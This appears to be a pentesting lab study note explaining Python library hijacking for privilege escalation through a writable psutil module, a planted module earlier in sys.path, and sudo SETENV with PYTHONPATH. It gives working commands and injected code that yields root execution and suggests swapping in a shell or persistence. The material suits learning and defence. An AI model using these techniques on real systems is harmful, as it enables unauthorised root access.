## Overview

Python Library Hijacking is a privilege escalation technique that abuses how Python resolves and imports modules.

If a privileged Python script imports a module from a location we can influence, we may be able to replace or override that module with malicious code and gain code execution in the context of the script’s owner, often **root**.

This commonly appears in:

- developer workstations
- internal automation servers
- custom admin tooling
- poorly permissioned Python environments
- sudo misconfigurations involving `SETENV`
- writable module directories

---

# Why It Works

Python resolves imports in a defined search order.

When a script runs:

1. Python searches for the requested module
2. It imports the **first matching module** it finds
3. Any code inside that module executes in the context of the calling script

If the calling script is privileged and we can control the imported module, we can hijack execution.

---

# Common Hijacking Paths

There are three main variants:

1. **Wrong write permissions on the real module**
2. **Library path hijacking**
3. **`PYTHONPATH` environment variable abuse**

---

# 1. Wrong Write Permissions

## Concept

If a privileged Python script imports a module that is **world-writable** or writable by our user/group, we can modify the real module directly and inject malicious code into a function the script uses.

---

## Example Privileged Script

```bash
ls -l mem_status.py
```

Example output:

```text
-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

This indicates:

- owned by root
- executable by us
- SUID-like example in the lab context
- script imports a Python module

View contents:

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
print(f"Available memory: {round(available_memory, 2)}%")
```

The script imports:

```python
psutil
```

---

## Locate the Function

Search for the imported function:

```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```

Check permissions on the real module:

```bash
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Example:

```text
-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

This is the key weakness:

the imported module is writable.

---

## Inject Code into the Function

Relevant function:

```python
def virtual_memory():
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    _TOTAL_PHYMEM = ret.total
    return ret
```

Hijacked version:

```python
def virtual_memory():
    import os
    os.system('id')

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    _TOTAL_PHYMEM = ret.total
    return ret
```

Run the script:

```bash
sudo /usr/bin/python3 ./mem_status.py
```

Example output:

```text
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

This confirms code execution as root.

---

## Key Idea

If the target script imports a writable module, we can inject code into:

- imported functions
- module-level code
- initialization routines

---

# 2. Library Path Hijacking

## Concept

Python imports modules in a priority order.

If the real module is in a **lower-priority path**, and we can write to a **higher-priority path**, we can create a fake module with the same name and Python will import ours first.

Think of it like placing a fake toolbox closer to the worker than the real one.

---

## Check Python Search Order

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

Example:

```text
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

---

## Find Real Module Location

```bash
pip3 show psutil
```

Example:

```text
Location: /usr/local/lib/python3.8/dist-packages
```

So the real `psutil` module is located here:

```text
/usr/local/lib/python3.8/dist-packages
```

But `/usr/lib/python3.8` is searched first.

---

## Check If Higher-Priority Path Is Writable

```bash
ls -la /usr/lib/python3.8
```

Example:

```text
drwxr-xrwx 30 root root 20480 Dec 14 16:26 .
```

If writable, we can drop our own malicious module there.

---

## Create Malicious Module

Create `psutil.py` in the higher-priority directory:

```python
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
```

The module name **must match**:

```text
psutil.py
```

The function name **must also match**:

```python
virtual_memory()
```

---

## Execute the Privileged Script

```bash
sudo /usr/bin/python3 mem_status.py
```

Example result:

```text
uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available'
```

Even though the script crashes, our malicious code already executed as root.

---

## Key Requirements

For this to work:

- the real module must live in a lower-priority path
- we must be able to write to a higher-priority path
- our fake module must match the imported module name
- the function signature should be compatible enough to execute before failure

---

# 3. PYTHONPATH Environment Variable Abuse

## Concept

`PYTHONPATH` tells Python where to search for modules.

If we are allowed to run Python with controlled environment variables, we can redirect imports to a directory containing our malicious module.

This is often seen with:

- `sudo SETENV`
- poorly locked down wrappers
- admin scripts launched with preserved environment variables

---

## Check sudo Rights

```bash
sudo -l
```

Example:

```text
User htb-student may run the following commands on host:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

Important keyword:

```text
SETENV
```

This allows us to set environment variables for the privileged Python binary.

---

## Prepare Malicious Module

Place malicious module in `/tmp/psutil.py`:

```python
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
```

---

## Execute with Controlled PYTHONPATH

```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

Example output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This works because Python searches `/tmp` first and imports our fake module instead of the legitimate one.

# Attack Workflow Summary

## 1. Inspect privileged Python scripts

Look for:

- sudoable Python binaries
- root-owned Python automation
- SUID lab binaries
- cron-executed Python scripts
- systemd services calling Python

---

## 2. Identify imports

```python
import psutil
from module import function
```

---

## 3. Check module resolution order

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

---

## 4. Locate real module

```bash
pip3 show <module>
python3 -c "import module; print(module.__file__)"
```

---

## 5. Test for writable module files or paths

```bash
ls -l /path/to/module.py
ls -ld /path/to/python/dir
```

---

## 6. Decide attack path

- edit real module directly
- create fake module in higher-priority path
- override import with `PYTHONPATH`

---

## 7. Place malicious code

Common test:

```python
import os
os.system('id')
```

Then replace with a shell or persistence action if needed and permitted.

# Common Misconfigurations

## Writable installed modules

Example:

```text
/usr/local/lib/python3.8/dist-packages/module.py
```

---

## Writable standard library directories

Example:

```text
/usr/lib/python3.8
```

---

## Sudo with SETENV on Python

Example:

```text
(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

---

## Root cron jobs launching Python scripts

If script imports attacker-controlled module, root execution may follow.

---

## Developer systems with shared write access

Particularly common in:

- lab environments
- shared workstations
- rushed internal tooling
- CI/CD runners

---

# Important Notes

## Module Name Must Match

If the script imports:

```python
import psutil
```

your malicious file must be:

```text
psutil.py
```

---

## Function Name Must Match

If the script calls:

```python
psutil.virtual_memory()
```

your module must define:

```python
def virtual_memory():
```

---

## Compatibility Matters

If the script relies on returned object attributes, your malicious function may need to return a compatible object if you want the script to continue cleanly.

If you only need code execution, a crash after execution is often still enough.

---

# Comparison of the Three Methods

| Method | Requirement | Best Use Case |
|--------|-------------|---------------|
| Wrong write permissions | writable real module | easiest if module file is editable |
| Library path hijacking | writable higher-priority path | great for path precedence abuse |
| `PYTHONPATH` abuse | sudo `SETENV` or env control | cleanest when environment variables are allowed |

---

# Key Takeaways

- Python import order can be abused for privilege escalation
- writable modules are a direct code execution opportunity
- writable higher-priority paths enable fake module injection
- `PYTHONPATH` is extremely powerful when combined with sudo `SETENV`
- developer and automation environments are especially prone to this issue
- a privileged script does not need to be obviously dangerous if its imports are unsafe
- import hijacking is often quieter than binary exploitation
- always inspect Python scripts, module paths, and writable library locations during enumeration
